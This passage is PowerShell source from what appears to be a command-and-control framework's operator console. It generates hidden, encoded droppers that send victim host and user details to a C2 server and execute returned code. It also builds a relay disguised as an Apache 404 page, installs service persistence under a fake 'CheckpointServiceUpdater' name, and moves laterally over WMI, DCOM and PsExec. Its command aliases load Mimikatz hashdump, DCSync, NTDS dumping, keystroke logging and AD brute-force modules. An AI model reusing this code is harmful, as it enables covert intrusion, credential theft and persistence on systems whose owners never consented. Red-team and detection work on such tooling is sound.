$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'

        function Get-RandomURI 
    {
        param (
            [int]$Length
        )
        $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
        $result = ''
        for ($x = 0; $x -lt $Length; $x++) 
        {
            $result += $set | Get-Random
        }
        return $result
    }
    
    function PatchDll {
        param($dllBytes, $replaceString, $Arch)

        if ($Arch -eq 'x86') {
            $dllOffset = 0x00012D80
            #$dllOffset = $dllOffset +8
        }
        if ($Arch -eq 'x64') {
            $dllOffset = 0x00016F00
        }

        # Patch DLL - replace 5000 A's
        $AAAA = "A"*5000
        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
        $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
        # Length of replacement code
        $dllLength = $replaceString.Length
        $patchLength = 5000 -$dllLength
        $nullString = 0x00*$patchLength
        $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
        $nullBytes = $nullBytes[1..$patchLength]
        $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

        $dllLength = 10000 -3
        $i=0
        # Loop through each byte from start position
        $dllOffset..($dllOffset + $dllLength) | % {
            $dllBytes[$_] = $replaceNewStringBytes[$i]
            $i++
        }
    
        # Return Patched DLL
        return $DllBytes
    }

# create proxypayloads
function CreateProxyPayload 
{
    param
    (
        [Object]
        $username,
        [Object]
        $password,
        [Object]
        $proxyurl
    )
                
    $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
    $payload = createrawpayload -command $command
    # create proxy payloads
    CreatePayload -Proxy 1
    CreateStandAloneExe -Proxy 1
    CreateServiceExe -Proxy 1
    CreateDLL -Proxy 1
}
function Invoke-DaisyChain {
param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)

$daisycommand = '$serverhost="'+$daisyserver+'"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$serverport='+$port+'
$server=$serverhost+":"+$serverport
function Get-Webclient ($Cookie) {
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
} $wc }
function primer {
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("$server/daisy")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'


$fdsf = @"
`$username = "$proxyuser"
`$password = "$proxypassword"
`$proxyurl = "$proxyurl"
`$domainfrontheader = "$domfront"
`$serverport = '$port'
`$Server = "${c2server}:${c2port}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
function Get-Webclient (`$Cookie)
{
`$username = `$username
`$password = `$password
`$proxyurl = `$proxyurl
`$wc = New-Object System.Net.WebClient;  
`$h=`$domainfrontheader
if (`$h) {`$wc.Headers.Add("Host",`$h)}
if (`$proxyurl) {
`$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
`$wc.Proxy = `$wp;
}
if (`$username -and `$password) {
`$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
`$getcreds = new-object system.management.automation.PSCredential `$username,`$PSS; 
`$wp.Credentials = `$getcreds;
} else {
`$wc.UseDefaultCredentials = `$true; 
}
if (`$cookie) {
`$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
}
`$wc
}
`$httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
'
`$URLS = '/connect',"/images/static/content/","/news/","/webapp/static/","/images/prints/","/wordpress/site/","/steam","/true/images/77/","/holidngs/images/","/daisy"
`$listener = New-Object -TypeName System.Net.HttpListener 
`$listener.Prefixes.Add("http://+:`$serverport/") 
`$listener.Start()
echo "started http server"
while (`$listener.IsListening) 
{
    `$message = `$null
    `$context = `$listener.GetContext() # blocks until request is received
    `$request = `$context.Request
    `$response = `$context.Response       
    `$url = `$request.RawUrl
    `$method = `$request.HttpMethod
    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) 
    {  
        `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
        `$responseStream = `$request.InputStream 
        `$targetStream = New-Object -TypeName System.IO.MemoryStream 
        `$buffer = new-object byte[] 10KB 
        `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
        `$downloadedBytes = `$count 
        while (`$count -gt 0) 
        { 
            `$targetStream.Write(`$buffer, 0, `$count) 
            `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
            `$downloadedBytes = `$downloadedBytes + `$count 
        } 
        `$len = `$targetStream.length
        `$size = `$len + 1
        `$size2 = `$len -1
        `$buffer = New-Object byte[] `$size
        `$targetStream.Position = 0
        `$targetStream.Read(`$buffer, 0, `$targetStream.Length)|Out-null
        `$buffer = `$buffer[0..`$size2]
        `$targetStream.Flush()
        `$targetStream.Close() 
        `$targetStream.Dispose()
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
        if (`$method -eq "GET") {
        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString(`$Server+`$url)
        }
        if (`$method -eq "POST") {
        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$Server`$url", `$buffer)
        }
    }
    if (!`$message) {
        `$message = `$httpresponse
        echo `$request
    }
    [byte[]] `$buffer = [System.Text.Encoding]::UTF8.GetBytes(`$message)
    `$response.ContentLength64 = `$buffer.length
    `$response.StatusCode = 200
    `$response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    `$response.Headers.Add("Pragma", "no-cache")
    `$response.Headers.Add("Expires", 0)
    `$output = `$response.OutputStream
    `$output.Write(`$buffer, 0, `$buffer.length)
    `$output.Close()
    `$message = `$null
}
`$listener.Stop()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)

$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
$bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
$payload = $payloadraw -replace "`n", ""

if (-not (Test-Path "$FolderPath\payloads\daisypayload.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
} 
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload2.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload2.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload2.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload3.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload3.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload3.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload4.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload4.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload4.bat"  -ForegroundColor Green
} else {
    Write-Host "Cannot create payload"
}
$rundaisy = @"
`$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
if (!`$t) { 
    if (Test-Administrator) { 
        start-job -ScriptBlock {$NewScript} | Out-Null 
    }
}

"@
[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $rundaisy)
Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green

return $rundaisy
}

function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function Upload-File
{
    param
    (
        [string] $Source,
        [string] $Destination
    )
 
    $Source = Resolve-PathSafe $Source
     
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
     
    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    "Upload-File -Destination '$Destination' -Base64 $base64"
    $reader.Dispose()
}
function CheckModuleLoaded {
    param
    (
    [string] $ModuleName,
    [string] $IMRandomURI
    )
    $ModuleName = $ModuleName.ToLower();
    $modsloaded = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$IMRandomURI'" -As SingleValue
    if (!$modsloaded.contains("$ModuleName")){
        $modsloaded = $modsloaded + " $ModuleName"
        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='$modsloaded' WHERE RandomURI='$IMRandomURI'"|Out-Null
        $query = "INSERT INTO NewTasks (RandomURI, Command)
        VALUES (@RandomURI, @Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
            RandomURI = $IMRandomURI
            Command   = "LoadModule $ModuleName"
        } | Out-Null
    }
}

function creds {
    param
    (
    [string] $action,
    [string] $username,
    [string] $password,
    [string] $hash,
    [string] $credsID
    )

    switch ($action){
            "dump" {
                $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds" -As PSObject
                Write-Output -InputObject $dbResult | ft -AutoSize | Out-Host
                $t = $dbResult | ft -AutoSize | Out-String
                return $t
            }
            "add" {
                if ($password){
                    $t = add-creds -username $username -password $password
                    return $t
                } elseif ($hash){
                    $t = add-creds -username $username -hash $hash
                    return $t
                } else {
                    return "Unable to create credentials in database."
                }
            }
            "del" {
                $t = Del-Creds $CredsID
                return $t
            }
            "search" {
                $t = Search-Creds $username
                return $t
            }
            default {
                return "No action defined for: '$action'"
            }
    }
}
function Add-Creds {
    param
    (
    [string] $Username,
    [string] $Password,
    [string] $Hash
    )
    if ($Username){
        Invoke-SqliteQuery -DataSource $Database -Query "INSERT INTO Creds (username, password, hash) VALUES ('$username','$password','$hash')"|Out-Null
        return "$Username added to the database"
    } else {
        return "No username or password specified. Please complete both arguments."
    }
}

function Search-Creds {
    param
    (
    [string] $Username
    )
        if ($Username){
            $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds WHERE username LIKE '%$username%'" -As PSObject
            Write-Output -InputObject $dbResult | ft -AutoSize | Out-Host
            return $dbResult | ft -AutoSize | Out-String
        } else {
            return "No username specified. Please complete all necessary arguments."
        }
}

function Del-Creds {
    param
    (
    [string] $CredsID
    )
    if ($credsID){
        $dbResult = Invoke-SqliteQuery -Datasource $database -Query "SELECT credsid, username FROM Creds Where CredsID == '$credsID'" -As DataRow
        $caption = "Delete Credentials from Database?";
        $message = "Credential: " + $dbResult.Item(0) + " - " + $dbResult.Item(1);
        $yes = new-Object System.Management.Automation.Host.ChoiceDescription "&Yes","YES";
        $no = new-Object System.Management.Automation.Host.ChoiceDescription "&No","NO";
        $choices = [System.Management.Automation.Host.ChoiceDescription[]]($yes,$no);
        $answer = $host.ui.PromptForChoice($caption,$message,$choices,0)

        switch ($answer){
            0 {Invoke-SqliteQuery -Datasource $database -Query "DELETE FROM Creds Where CredsID == '$credsID'" | out-null; return "Deleting Credentials"}
            1 {return "No selected, no changes made";}
        }
    } else {
        return "No CredsID specified. Please complete all necessary arguments."
    }
}

# run startup function
startup

function runcommand {

param
(
[string] $pscommand,
[string] $psrandomuri
)
# alias list
            if ($pscommand.ToLower().StartsWith('load-module'))
            { 
                $pscommand = $pscommand -replace "load-module","loadmodule"
            }
            if ($pscommand)
            { 
                CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
            }
            if ($pscommand -eq 'Get-ExternalIP') 
            {
                $pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'
            }  
            if ($pscommand -eq 'getuid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }  
            if ($pscommand -eq 'ps') 
            {
                $pscommand = 'get-processfull'
            }
            if ($pscommand -eq 'id') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'whoami') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Kill-Implant') 
            {
                $pscommand = 'exit'
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"|Out-Null
            }
            if ($pscommand -eq 'Show-ServerInfo') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                Write-Host $dbresult
            }
            if ($pscommand -eq 'get-pid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'ListModules') 
            {
                $pscommand = $null
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        Write-Host $mod
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  Write-Host $mod
                }
                
                Write-Host -Object ""
            }  
            if ($pscommand -eq 'ModulesLoaded') 
            {
                $pscommand = $null
                $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $mods
            }
            if ($pscommand -eq 'Remove-ServiceLevel-Persistence') 
            {
                $pscommand = "sc.exe delete CPUpdater"       
            }
            if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
            }
            if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcomproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $target = $pscommand -replace 'invoke-dcomproxypayload -target ', ''
                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $proxypayload`",`"7`")"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcompayload'))
            {
                   $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                   $target = $pscommand -replace 'invoke-dcomproxypayload -target ', ''
                   $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $payload`",`"7`")"
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
            {
                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run Invoke-DaisyChain first"
                    $pscommand = $null
                }
            }            
            if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$payload'"
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('hashdump'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                $pscommand = "Invoke-Mimikatz -Command `'`"lsadump::sam`"`'"
            }
            if ($pscommand.ToLower().StartsWith('get-wlanpass'))
            { 
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
            { 
                CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-firewall'))
            { 
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x86'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-x86'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"

            }
            if ($pscommand.ToLower().StartsWith('migrate-x64'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'invoke-psinject-payload',''
                $pscommand = "invoke-reflectivepeinjection $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject'))
            { 
                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-bloodhounddata'))
            { 
                CheckModuleLoaded "bloodhound.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sniffer'))
            { 
                CheckModuleLoaded "invoke-sniffer.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('test-adcredential'))
            { 
                CheckModuleLoaded "test-adcredential.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
            { 
                CheckModuleLoaded "Powerup.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
            { 
                CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-recentfiles'))
            { 
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-tokenmanipulation'))
            { 
                CheckModuleLoaded "Invoke-TokenManipulation.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "Inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smbexec'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('new-zipfile'))
            { 
                CheckModuleLoaded "Zippy.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smblogin'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiexec'))
            { 
                CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-pipekat'))
            { 
                CheckModuleLoaded "Invoke-Pipekat.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-net'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mapdomaintrust'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-kerb'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mimikatz'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-userhunter'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
            { 
                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
            { 
                CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-keystrokes'))
            { 
                CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
            }
            if ($pscommand.ToLower().StartsWith('invoke-portscan'))
            { 
                CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-mshotfixes'))
            { 
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-gpppassword'))
            { 
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-wmicommand'))
            {
                CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('dump-ntds'))
            {
                CheckModuleLoaded "dump-ntds.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-ad'))
            {
                CheckModuleLoaded "brute-ad.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-locadmin'))
            {
                CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-passpol'))
            {
                CheckModuleLoaded "get-passpol.ps1" $psrandomuri
            }
